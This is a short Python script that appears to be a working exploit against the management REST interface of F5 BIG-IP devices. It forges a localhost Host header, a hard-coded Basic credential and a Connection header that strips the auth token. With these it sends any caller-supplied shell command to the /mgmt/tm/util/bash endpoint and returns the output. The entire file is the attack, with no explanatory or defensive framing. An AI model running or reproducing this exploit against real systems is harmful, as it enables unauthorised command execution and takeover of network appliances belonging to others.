import requests
import urllib3

urllib3.disable_warnings()


def exploit(target, command):
    url = f"https://{target}/mgmt/tm/util/bash"
    headers = {
        "Host": "127.0.0.1",
        "Authorization": "Basic YWRtaW46aG9yaXpvbjM=",
        "X-F5-Auth-Token": "asdf",
        "Connection": "X-F5-Auth-Token",
        "Content-Type": "application/json",
    }
    j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(command)}
    response = requests.post(url, headers=headers, json=j, verify=False, timeout=10)
    response.raise_for_status()  # raises exception when not a 2xx response
    if response.status_code != 204 and response.headers[
        "content-type"
    ].strip().startswith("application/json"):
        result = {"message": response.json()["commandResult"].strip()}
    else:
        result = {
            "message": "Response is empty! Target does not seems to be vulnerable.."
        }

    return result
